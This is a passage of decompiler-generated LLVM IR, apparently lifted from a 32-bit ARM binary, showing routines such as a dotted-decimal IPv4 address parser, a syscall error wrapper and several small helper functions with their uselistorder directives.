  %v3_16050 = load i8, i8* %v2_16050, align 1
  %v4_16050 = zext i8 %v3_16050 to i32
  %v9_16054 = icmp eq i32 %v4_16050, %v1_15f90
  br i1 %v9_16054, label %dec_label_pc_1606c, label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %dec_label_pc_16050
  %v2_16060 = icmp eq i8 %v3_16050, 0
  br i1 %v2_16060, label %dec_label_pc_16068, label %dec_label_pc_15fc4

dec_label_pc_16068:                               ; preds = %dec_label_pc_15fa4, %dec_label_pc_16060, %dec_label_pc_16048, %dec_label_pc_16030, %dec_label_pc_16018
  br label %dec_label_pc_1606c

dec_label_pc_1606c:                               ; preds = %dec_label_pc_15f98, %dec_label_pc_16050, %dec_label_pc_16038, %dec_label_pc_16020, %dec_label_pc_16008, %dec_label_pc_16068
  %v1_16070 = phi i32 [ 0, %dec_label_pc_16068 ], [ %v1_16050, %dec_label_pc_16050 ], [ %v1_16038, %dec_label_pc_16038 ], [ %v1_16020, %dec_label_pc_16020 ], [ %v0_16028, %dec_label_pc_16008 ], [ %v0_15fac, %dec_label_pc_15f98 ]
  ret i32 %v1_16070

; uselistorder directives
  uselistorder i32 %v4_15fc4, { 1, 0 }
  uselistorder i32 %v2_15fc4, { 0, 2, 1 }
  uselistorder i32 %v0_16028, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15fb8, { 1, 0 }
  uselistorder i32 %v1_15fac, { 1, 0, 2 }
  uselistorder i32 %v0_15fb03, { 2, 1, 0 }
  uselistorder i32 %v1_15f90, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 3, 4, 1, 5, 66, 67, 117, 68, 69, 70, 71, 72, 73, 75, 76, 118, 7, 113, 29, 114, 28, 115, 42, 116, 74, 43, 82, 31, 77, 78, 2, 79, 80, 81, 44, 8, 83, 30, 84, 45, 85, 46, 86, 47, 87, 48, 88, 32, 49, 50, 51, 52, 53, 0, 89, 90, 91, 10, 9, 54, 92, 33, 93, 12, 11, 55, 94, 34, 95, 57, 96, 14, 13, 56, 97, 35, 98, 59, 99, 16, 15, 58, 100, 36, 101, 60, 18, 17, 61, 103, 37, 104, 20, 19, 62, 38, 105, 22, 21, 63, 106, 39, 107, 24, 23, 64, 108, 40, 109, 26, 25, 65, 110, 41, 111, 27, 112, 6, 102 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 149, 153, 148, 154, 26, 27, 28, 29, 30, 31, 32, 33, 147, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 2, 44, 0, 3, 45, 46, 48, 47, 1, 51, 49, 50, 52, 150, 54, 53, 57, 58, 59, 55, 56, 60, 61, 63, 64, 65, 62, 66, 151, 67, 69, 68, 71, 70, 72, 152, 73, 75, 74, 77, 76, 82, 78, 83, 79, 84, 80, 81, 85, 86, 87, 88, 90, 91, 89, 146, 93, 92, 96, 97, 98, 94, 95, 99, 106, 100, 107, 101, 108, 102, 109, 103, 110, 104, 105, 112, 111, 113, 114, 115, 116, 121, 117, 122, 118, 123, 119, 120, 125, 124, 126, 127, 128, 131, 129, 132, 130, 133, 134, 135, 136, 137, 139, 140, 138, 141, 143, 144, 142, 145 }
  uselistorder label %dec_label_pc_1606c, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16068, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16008, { 1, 0 }
  uselistorder label %dec_label_pc_15f98, { 1, 0 }
}

define i32 @function_1607c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1607c:
  %stack_var_-68 = alloca i32, align 4
  %v2_16084 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_16084, i32* @r1, align 4
  %v0_16088 = call i32 @function_160a0()
  %v1_1608c = sub i32 1, %v0_16088
  %v2_1608c = icmp ult i32 %v0_16088, 2
  br i1 %v2_1608c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_1607c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_1607c, %bb
  %v1_1609c = phi i32 [ %v1_1608c, %dec_label_pc_1607c ], [ 0, %bb ]
  ret i32 %v1_1609c

; uselistorder directives
  uselistorder i32 %v0_16088, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_160a0() local_unnamed_addr {
dec_label_pc_160a0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_160a0 = load i32, i32* @r4, align 4
  %v6_160a0 = load i32, i32* @r5, align 4
  %v2_160a8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_160ac = load i32, i32* @r1, align 4
  store i32 %v0_160ac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_160b8 = load i32, i32* @r0, align 4
  %v3_160b8 = call i32 @function_11280(i32 %v0_160b8, i32 21505, i32 %v2_160a8)
  store i32 %v3_160b8, i32* %r0.global-to-local, align 4
  store i32 %v3_160b8, i32* @r5, align 4
  %v2_160bc = icmp eq i32 %v3_160b8, 0
  br i1 %v2_160bc, label %dec_label_pc_160c4, label %dec_label_pc_16108

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160a0
  %v4_160d0 = zext i8 %tmp to i32
  store i32 %v4_160d0, i32* @ip, align 4
  %v3_160d4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_160d4, i32* @r3, align 4
  %v1_160d8 = load i32, i32* @r4, align 4
  %v2_160d8 = add i32 %v1_160d8, 4
  %v3_160d8 = inttoptr i32 %v2_160d8 to i32*
  %v0_160dc = load i32, i32* %r1.global-to-local, align 4
  %v1_160dc = load i32, i32* @r4, align 4
  %v2_160dc = add i32 %v1_160dc, 8
  %v3_160dc = inttoptr i32 %v2_160dc to i32*
  store i32 %v0_160dc, i32* %v3_160dc, align 4
  %v0_160e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_160e0 = load i32, i32* @r4, align 4
  %v2_160e0 = add i32 %v1_160e0, 12
  %v3_160e0 = inttoptr i32 %v2_160e0 to i32*
  store i32 %v0_160e0, i32* %v3_160e0, align 4
  %v2_160e4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_160e4, i32* @r1, align 4
  %v1_160ec = load i32, i32* @r4, align 4
  %v2_160ec = inttoptr i32 %v1_160ec to i32*
  store i32 %v3_160d4, i32* %v2_160ec, align 4
  %v0_160f0 = load i32, i32* @ip, align 4
  %v1_160f0 = trunc i32 %v0_160f0 to i8
  %v2_160f0 = load i32, i32* @r4, align 4
  %v3_160f0 = add i32 %v2_160f0, 16
  %v4_160f0 = inttoptr i32 %v3_160f0 to i8*
  store i8 %v1_160f0, i8* %v4_160f0, align 1
  %v0_160f4 = load i32, i32* @r4, align 4
  %v1_160f4 = add i32 %v0_160f4, 17
  store i32 %v1_160f4, i32* %r0.global-to-local, align 4
  %v4_160f8 = call i32 @function_165e4(i32 %v1_160f4, i32 %v2_160e4, i32 19, i32 %v3_160d4)
  store i32 %v4_160f8, i32* %r0.global-to-local, align 4
  %v0_160fc = load i32, i32* @r5, align 4
  store i32 %v0_160fc, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_16104 = inttoptr i32 %v4_160f8 to i8*
  %v3_16104 = call i32 @function_11790(i8* %v2_16104, i32 %v0_160fc)
  store i32 %v3_16104, i32* %r0.global-to-local, align 4
  %v0_16108.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16108

dec_label_pc_16108:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160c4
  %v0_16108 = phi i32 [ %v3_160b8, %dec_label_pc_160a0 ], [ %v0_16108.pre, %dec_label_pc_160c4 ]
  store i32 %v0_16108, i32* %r0.global-to-local, align 4
  store i32 %v3_160a0, i32* @r4, align 4
  store i32 %v6_160a0, i32* @r5, align 4
  ret i32 %v0_16108

; uselistorder directives
  uselistorder i32 %v0_16108, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i8*, i32)* @function_11790, { 2, 7, 8, 3, 0, 1, 11, 10, 9, 4, 5, 6 }
  uselistorder i32 13, { 26, 25, 0, 1, 28, 29, 27, 30, 31, 2, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 5, 4, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 23, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 24, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 6, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 7, 69, 70 }
  uselistorder i32 17, { 14, 1, 4, 15, 16, 5, 17, 18, 19, 6, 7, 8, 9, 2, 20, 3, 21, 22, 10, 23, 11, 24, 25, 26, 0, 27, 12, 28, 13 }
  uselistorder i32 (i32, i32, i32)* @function_11280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16108, { 1, 0 }
}

define i32 @function_1611c() local_unnamed_addr {
dec_label_pc_1611c:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1611c = load i32, i32* @r4, align 4
  store i32 %v3_1611c, i32* %stack_var_-28, align 4
  %v0_16124 = load i32, i32* @r0, align 4
  %v2_16124 = icmp eq i32 %v0_16124, 0
  %v0_1612c = load i32, i32* @r1, align 4
  br i1 %v2_16124, label %dec_label_pc_16200, label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_1611c
  br label %dec_label_pc_1614c

dec_label_pc_1614c:                               ; preds = %dec_label_pc_16134, %dec_label_pc_161c4
  %v1_161c4 = phi i32 [ 0, %dec_label_pc_16134 ], [ %v5_161c4, %dec_label_pc_161c4 ]
  %v0_161c8 = phi i32 [ 1, %dec_label_pc_16134 ], [ %v1_161c8, %dec_label_pc_161c4 ]
  %v0_1614c = phi i32 [ %v0_16124, %dec_label_pc_16134 ], [ %v0_1614c12, %dec_label_pc_161c4 ]
  %v1_1614c = inttoptr i32 %v0_1614c to i8*
  %v2_1614c = load i8, i8* %v1_1614c, align 1
  %v3_1614c = zext i8 %v2_1614c to i32
  %v4_16150 = load i32, i32* inttoptr (i32 127216 to i32*), align 16
  %v2_16154 = mul nuw nsw i32 %v3_1614c, 2
  %v2_16158 = add i32 %v2_16154, %v4_16150
  %v3_16158 = inttoptr i32 %v2_16158 to i16*
  %v4_16158 = load i16, i16* %v3_16158, align 2
  %v1_1615c = and i16 %v4_16158, 8
  %v2_1615c = icmp eq i16 %v1_1615c, 0
  br i1 %v2_1615c, label %dec_label_pc_16200, label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %dec_label_pc_1614c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_16184

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16184
  %v2_1616c = mul i32 %v0_161c4, 10
  %v1_16170 = add i32 %v2_1616c, -48
  %v2_16174 = add i32 %v3_16184, %v1_16170
  store i32 %v2_16174, i32* @ip, align 4
  %v8_1617c = icmp sgt i32 %v2_16174, 255
  br i1 %v8_1617c, label %dec_label_pc_16200, label %dec_label_pc_16180

dec_label_pc_16180:                               ; preds = %dec_label_pc_1616c
  %v1_16180 = add i32 %v0_161b4, 1
  store i32 %v1_16180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16184

dec_label_pc_16184:                               ; preds = %dec_label_pc_16164, %dec_label_pc_16180
  %v0_161c4 = phi i32 [ 0, %dec_label_pc_16164 ], [ %v2_16174, %dec_label_pc_16180 ]
  %v0_161b4 = phi i32 [ %v0_1614c, %dec_label_pc_16164 ], [ %v1_16180, %dec_label_pc_16180 ]
  %v1_16184 = inttoptr i32 %v0_161b4 to i8*
  %v2_16184 = load i8, i8* %v1_16184, align 1
  %v3_16184 = zext i8 %v2_16184 to i32
  %v2_16188 = mul nuw nsw i32 %v3_16184, 2
  %v2_1618c = add i32 %v2_16188, %v4_16150
  %v3_1618c = inttoptr i32 %v2_1618c to i16*
  %v4_1618c = load i16, i16* %v3_1618c, align 2
  %v6_1618c = zext i16 %v4_1618c to i32
  %v1_16190 = and i32 %v6_1618c, 8
  %v2_16190 = icmp eq i32 %v1_16190, 0
  br i1 %v2_16190, label %dec_label_pc_16198, label %dec_label_pc_1616c

dec_label_pc_16198:                               ; preds = %dec_label_pc_16184
  %v7_16198 = icmp eq i32 %v0_161c8, 4
  br i1 %v7_16198, label %dec_label_pc_161b0, label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %dec_label_pc_16198
  %v7_161a0 = icmp eq i8 %v2_16184, 46
  br i1 %v7_161a0, label %dec_label_pc_161a8, label %dec_label_pc_16200

dec_label_pc_161a8:                               ; preds = %dec_label_pc_161a0
  %v1_161a8 = add i32 %v0_161b4, 1
  store i32 %v1_161a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161c4

dec_label_pc_161b0:                               ; preds = %dec_label_pc_16198
  %v2_161b0 = icmp eq i8 %v2_16184, 0
  %v1_161b4 = add i32 %v0_161b4, 1
  store i32 %v1_161b4, i32* %r0.global-to-local, align 4
  br i1 %v2_161b0, label %dec_label_pc_161c4, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161b0
  %v1_161bc = and i32 %v6_1618c, 32
  %v2_161bc = icmp eq i32 %v1_161bc, 0
  br i1 %v2_161bc, label %dec_label_pc_16200, label %dec_label_pc_161c4

dec_label_pc_161c4:                               ; preds = %dec_label_pc_161bc, %dec_label_pc_161b0, %dec_label_pc_161a8
  %v0_1614c12 = phi i32 [ %v1_161b4, %dec_label_pc_161bc ], [ %v1_161b4, %dec_label_pc_161b0 ], [ %v1_161a8, %dec_label_pc_161a8 ]
  %v4_161c4 = mul i32 %v1_161c4, 256
  %v5_161c4 = or i32 %v0_161c4, %v4_161c4
  %v1_161c8 = add nuw nsw i32 %v0_161c8, 1
  %v7_161d0 = icmp slt i32 %v1_161c8, 5
  br i1 %v7_161d0, label %dec_label_pc_1614c, label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %dec_label_pc_161c4
  %v2_161d4 = icmp eq i32 %v0_1612c, 0
  br i1 %v2_161d4, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_161d4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16204

bb:                                               ; preds = %dec_label_pc_161d4
  %v4_161d8 = udiv i32 %v5_161c4, 16777216
  %v2_161dc = udiv i32 %v5_161c4, 256
  %v5_161e0 = and i32 %v2_161dc, 65280
  %v2_161e4 = and i32 %v5_161c4, 65280
  %v5_161e8 = mul nuw nsw i32 %v2_161e4, 256
  %v5_161ec = mul i32 %v0_161c4, 16777216
  %v6_161e0 = or i32 %v4_161d8, %v5_161ec
  %v6_161e8 = or i32 %v6_161e0, %v5_161e0
  %v6_161ec = or i32 %v6_161e8, %v5_161e8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_161f8 = inttoptr i32 %v0_1612c to i32*
  store i32 %v6_161ec, i32* %v3_161f8, align 4
  %v2_16204.pre = load i32, i32* %stack_var_-28, align 4
  %v1_16208.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16204

dec_label_pc_16200:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161bc, %dec_label_pc_1614c, %dec_label_pc_1616c, %dec_label_pc_1611c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_16200
  %v1_16208 = phi i32 [ %v1_16208.pre, %bb ], [ 0, %dec_label_pc_16200 ], [ 1, %.thread7.thread ]
  %v2_16204 = phi i32 [ %v2_16204.pre, %bb ], [ %v3_1611c, %dec_label_pc_16200 ], [ %v3_1611c, %.thread7.thread ]
  store i32 %v2_16204, i32* @r4, align 4
  ret i32 %v1_16208

; uselistorder directives
  uselistorder i32 %v1_161c8, { 1, 0 }
  uselistorder i32 %v5_161c4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_161b4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 65, 2, 9, 1, 53, 3, 10, 4, 0, 5, 54, 55, 11, 12, 6, 13, 56, 57, 44, 14, 15, 16, 17, 18, 47, 48, 45, 46, 58, 59, 60, 51, 52, 49, 50, 61, 62, 63, 19, 20, 21, 22, 23, 66, 67, 24, 25, 26, 68, 27, 28, 69, 29, 30, 31, 32, 70, 33, 34, 71, 35, 36, 37, 38, 72, 73, 39, 40, 41, 42, 43, 74, 7, 75, 8, 64 }
  uselistorder i32 16777216, { 0, 1, 74, 73, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 31, 30, 33, 32, 35, 34, 36, 37, 38, 42, 39, 43, 40, 41, 44, 45, 47, 46, 48, 49, 51, 50, 56, 52, 57, 53, 54, 55, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75 }
  uselistorder i32 5, { 15, 0, 53, 5, 29, 30, 16, 25, 17, 26, 18, 27, 19, 28, 3, 2, 31, 32, 1, 33, 34, 35, 20, 21, 36, 22, 23, 6, 37, 7, 38, 39, 8, 40, 41, 9, 42, 46, 10, 47, 11, 48, 12, 49, 13, 50, 14, 51, 4, 52, 43, 24, 44, 45 }
  uselistorder i32 32, { 94, 46, 44, 83, 84, 85, 86, 91, 92, 79, 80, 81, 82, 89, 90, 47, 48, 52, 49, 53, 50, 54, 51, 55, 56, 97, 98, 57, 99, 65, 66, 64, 67, 68, 69, 70, 71, 72, 59, 60, 2, 61, 3, 62, 5, 4, 58, 63, 73, 100, 7, 6, 9, 8, 11, 10, 45, 74, 93, 13, 12, 15, 14, 17, 16, 19, 18, 78, 21, 20, 23, 22, 24, 26, 25, 27, 28, 30, 29, 87, 88, 31, 32, 75, 33, 34, 35, 76, 36, 0, 37, 1, 38, 95, 39, 96, 40, 41, 42, 43, 77 }
  uselistorder i8 0, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 28, 19, 30, 4, 17, 5, 31, 33, 32, 20, 34, 35, 21, 36, 37, 0, 18, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 53, 55, 52, 22, 54, 23, 56, 57, 51, 2, 58, 59, 60, 25, 61, 64, 26, 62, 63, 24, 65, 66, 67, 68, 69, 3, 70, 27, 71, 72, 73, 74, 75, 76, 77 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 5, 14, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i32 10, { 4, 25, 26, 27, 7, 42, 44, 43, 0, 39, 40, 73, 45, 1, 33, 29, 9, 28, 10, 30, 11, 31, 12, 32, 22, 5, 34, 23, 13, 3, 24, 35, 14, 36, 37, 38, 15, 16, 17, 41, 8, 46, 47, 48, 49, 50, 51, 52, 18, 53, 54, 55, 19, 56, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 6, 72, 20, 74, 21 }
  uselistorder i16 0, { 0, 1, 2, 3, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 6, 19, 7, 20, 21, 22, 23, 24 }
  uselistorder i32 2, { 5, 6, 167, 67, 68, 64, 312, 313, 80, 314, 315, 69, 316, 317, 173, 168, 174, 169, 95, 7, 175, 8, 70, 9, 10, 318, 74, 302, 11, 12, 303, 13, 14, 63, 299, 15, 16, 17, 300, 304, 18, 19, 20, 21, 81, 305, 306, 22, 23, 0, 170, 307, 24, 308, 96, 25, 166, 26, 27, 28, 29, 30, 97, 99, 98, 71, 72, 100, 197, 198, 101, 189, 106, 190, 107, 191, 108, 192, 103, 199, 104, 176, 182, 85, 177, 105, 178, 86, 179, 87, 180, 88, 181, 183, 184, 185, 186, 187, 89, 188, 109, 193, 110, 194, 111, 195, 102, 196, 82, 31, 32, 200, 203, 204, 112, 75, 171, 205, 113, 206, 115, 201, 114, 202, 212, 213, 33, 116, 117, 118, 214, 215, 119, 34, 35, 91, 207, 77, 76, 120, 90, 208, 121, 209, 36, 37, 122, 210, 211, 123, 92, 124, 125, 38, 127, 78, 128, 126, 216, 129, 130, 131, 132, 133, 134, 73, 79, 217, 218, 219, 220, 221, 222, 223, 224, 225, 1, 39, 40, 41, 42, 43, 44, 135, 226, 93, 227, 228, 229, 230, 231, 232, 2, 45, 46, 47, 48, 49, 50, 137, 233, 136, 234, 235, 236, 237, 238, 239, 139, 240, 140, 241, 141, 242, 51, 3, 52, 53, 54, 55, 56, 142, 243, 138, 244, 245, 246, 247, 248, 249, 144, 250, 145, 251, 146, 252, 57, 4, 58, 59, 60, 61, 62, 147, 253, 143, 254, 256, 257, 258, 259, 260, 261, 149, 262, 148, 263, 264, 265, 266, 267, 268, 150, 94, 269, 270, 65, 271, 272, 273, 274, 275, 276, 152, 151, 277, 278, 66, 279, 280, 154, 281, 155, 282, 283, 284, 285, 286, 156, 287, 153, 288, 289, 290, 291, 292, 293, 158, 294, 157, 295, 296, 298, 159, 297, 160, 161, 309, 311, 162, 310, 163, 164, 83, 301, 165, 84, 255, 172 }
  uselistorder label %dec_label_pc_16204, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16200, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_16184, { 1, 0 }
  uselistorder label %dec_label_pc_1614c, { 1, 0 }
}

define i32 @function_16214(i32 %arg1) local_unnamed_addr {
dec_label_pc_16214:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v4_16220 = load i32, i32* inttoptr (i32 127092 to i32*), align 4
  %v4_16228 = load i32, i32* inttoptr (i32 127056 to i32*), align 16
  store i32 %v4_16228, i32* %r1.global-to-local, align 4
  %v1_1622c = add i32 %arg1, 44
  %v2_1622c = inttoptr i32 %v1_1622c to i32*
  %v3_1622c = load i32, i32* %v2_1622c, align 4
  %v1_16230 = add i32 %arg1, 28
  %v2_16230 = inttoptr i32 %v1_16230 to i32*
  %v3_16230 = load i32, i32* %v2_16230, align 4
  store i32 %v3_16230, i32* %r2.global-to-local, align 4
  %v2_16234 = inttoptr i32 %v4_16220 to i32*
  store i32 %v3_1622c, i32* %v2_16234, align 4
  %v0_16238 = load i32, i32* %r2.global-to-local, align 4
  %v1_16238 = load i32, i32* %r1.global-to-local, align 4
  %v2_16238 = inttoptr i32 %v1_16238 to i32*
  store i32 %v0_16238, i32* %v2_16238, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 39, 0, 1, 3, 4, 5, 2, 6, 7, 8, 12, 9, 13, 11, 23, 24, 25, 26, 27, 28, 20, 21, 22, 18, 19, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 10, 14, 15, 16, 17 }
  uselistorder i32 126992, { 46, 0, 47, 48, 1, 2, 49, 3, 4, 5, 50, 51, 6, 7, 52, 8, 53, 54, 55, 56, 9, 12, 13, 11, 10, 14, 15, 41, 37, 35, 34, 36, 38, 39, 40, 33, 42, 28, 30, 29, 27, 26, 31, 32, 23, 22, 25, 24, 21, 20, 19, 18, 43, 44, 45, 57, 58, 59, 16, 17 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_16244(i32 %arg1) local_unnamed_addr {
dec_label_pc_16244:
  %v0_16244 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16244, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16244
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16244, %bb
  %v4_16248 = phi i32 [ %arg1, %dec_label_pc_16244 ], [ 0, %bb ]
  ret i32 %v4_16248

; uselistorder directives
  uselistorder i1* @cpsr_z, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 33, 14, 15, 16, 29, 30, 31, 32, 17, 18, 19, 20, 21, 22, 27, 28, 23, 0, 1, 24, 25, 2, 26, 3, 4 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1624c(i32 %arg1) local_unnamed_addr {
dec_label_pc_16288:
  store i32 %arg1, i32* @global_var_212d4.482, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_212d4.482, { 1, 0, 2 }
}

define i32 @function_16298(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16298:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16298 = load i32, i32* @r7, align 4
  store i32 %v3_16298, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_162c0, label %dec_label_pc_162b0

dec_label_pc_162b0:                               ; preds = %dec_label_pc_16298
  %v0_162b0 = call i32 @function_11734()
  %v0_162b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_162b4 = sub i32 0, %v0_162b4
  %v2_162b8 = inttoptr i32 %v0_162b0 to i32*
  store i32 %v1_162b4, i32* %v2_162b8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_162c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_16298, %dec_label_pc_162b0
  %v2_162c4 = phi i32 [ %v3_16298, %dec_label_pc_16298 ], [ %v2_162c4.pre, %dec_label_pc_162b0 ]
  %v0_162c0 = phi i32 [ %arg1, %dec_label_pc_16298 ], [ -1, %dec_label_pc_162b0 ]
  store i32 %v2_162c4, i32* %r7.global-to-local, align 4
  ret i32 %v0_162c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_162c0, { 1, 0 }
}

define i32 @function_162cc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_162cc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_162d0 = load i32, i32* @r4, align 4
  %v6_162d0 = load i32, i32* @r5, align 4
  %v12_162d0 = load i32, i32* @r7, align 4
  %v1_162d4 = add i32 %arg3, 14
  %v2_162dc = ptrtoint i32* %stack_var_-72 to i32
  %v1_162e0 = and i32 %v1_162d4, -8
  %v2_162e4 = sub i32 %v2_162dc, %v1_162e0
  %v1_162e8 = add i32 %v2_162e4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_162e8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_16324, label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_162cc
  %v0_16310 = call i32 @function_11734()
  %v0_16314 = load i32, i32* %r4.global-to-local, align 4
  %v1_16314 = sub i32 0, %v0_16314
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1631c = inttoptr i32 %v0_16310 to i32*
  store i32 %v1_16314, i32* %v2_1631c, align 4
  %v0_1632c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1632c

dec_label_pc_16324:                               ; preds = %dec_label_pc_162cc
  br i1 false, label %dec_label_pc_1632c, label %dec_label_pc_16334

dec_label_pc_1632c:                               ; preds = %dec_label_pc_16324, %dec_label_pc_16310
  %v0_1632c = phi i32 [ -1, %dec_label_pc_16324 ], [ %v0_1632c.pre, %dec_label_pc_16310 ]
  store i32 %v0_1632c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16334:                               ; preds = %dec_label_pc_16324
  %v2_16334 = add i32 %v1_162e8, %arg1
  %v2_16338 = add i32 %tmp, %arg3
  store i32 %v2_16338, i32* @ip, align 4
  store i32 %v1_162e8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_163e8

dec_label_pc_16354:                               ; preds = %dec_label_pc_163e8
  %v1_16354 = add i32 %v0_163a8, 16
  %v2_16354 = inttoptr i32 %v1_16354 to i16*
  %v3_16354 = load i16, i16* %v2_16354, align 2
  %v4_16354 = zext i16 %v3_16354 to i32
  %v1_16358 = add nuw nsw i32 %v4_16354, 7
  %v1_1635c = and i32 %v1_16358, 131064
  store i32 %v1_1635c, i32* %r2.global-to-local, align 4
  %v2_16364 = add i32 %v1_1635c, %v0_163b0
  store i32 %v2_16364, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_16364, %v2_16338
  br i1 %tmp26, label %dec_label_pc_16370, label %dec_label_pc_163a4

dec_label_pc_16370:                               ; preds = %dec_label_pc_16354
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_16378 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16378, i32* %r2.global-to-local, align 4
  %v0_1637c = load i32, i32* %sl.global-to-local, align 4
